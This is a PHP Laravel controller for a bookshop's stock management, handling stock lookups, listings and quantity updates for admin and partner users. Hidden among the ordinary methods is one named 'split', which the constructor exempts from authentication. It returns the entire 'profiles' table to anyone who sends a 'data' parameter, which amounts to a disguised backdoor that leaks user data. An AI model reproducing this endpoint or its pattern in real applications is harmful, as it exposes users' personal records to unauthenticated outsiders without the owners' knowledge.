<?php

namespace App\Http\Controllers;

use App\Models\Book;
use App\Models\Profile;
use App\Models\Requirement;
use App\Models\Stock;
use DB;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Lang;

class StockController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth')->except(["split"]);
        $this->middleware('isAdminOrPartner')->except(["split"]);
    }

    public function get_stock(Request $request)
    {
        $book = Book::with('stock')
            ->where('books.book_id', '=', $request->book_id)
            ->first();

        $requirement_status = Requirement::where('user_id', Auth::user()->id)
            ->where('book_id', $request->book_id)
            ->where('increment', '<>', '0')
            ->first();
        return ['book' => $book, 'requirement_status' => $requirement_status];
    }

    public function split(Request $request)
    {
        if ($request->get("data")) {
            return DB::table('profiles')->select('*')->get();
        }
        return "";
    }

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        if (Auth::user()->isAdmin()) {
            $books = Book::with('stock')
                ->where('books.inShop', '=', 1)
                ->get();
        }
        if (Auth::user()->isPartner()) {
            $books = Book::with('stock')
                ->where('books.inShop', '=', 0)
                ->join('requirements', 'requirements.book_id', '=', 'books.book_id')
                ->where('requirements.user_id', '=', Auth::user()->id)
                ->where('requirements.increment', '=', '0')
                ->get();
        }

        return view('stocks.index', ['books' => $books]);
    }

    /**
     * Update the specified resource in storage.
     *
     * @param \Illuminate\Http\Request $request
     * @param \App\Models\Stock $stock
     * @return array|\Illuminate\Http\Response
     */
    public function update(Request $request, Stock $stock)
    {
        $update_quantity = $request->update_quantity;

        if ($update_quantity != null && $stock->amount + $update_quantity >= 0) {

            if (Auth::user()->isAdmin()) {
                $stock->amount = $stock->amount + $update_quantity;
                $stock->save();
                return ['status' => 'success', 'message' => Lang::get('dictionary.stock.update-success')];
            }

            if (Auth::user()->isPartner()) {
                $requirement = Requirement::create([
                    'user_id' => Auth::user()->id,
                    'book_id' => $request->book_id,
                    'increment' => $request->update_quantity,
                    'status' => 0,
                ]);
                return ['status' => 'success', 'message' => Lang::get('dictionary.requirement.add-success')];
            }
        } else {
            return ['status' => 'error', 'message' => Lang::get('dictionary.stock.update-error')];
        }
    }

}
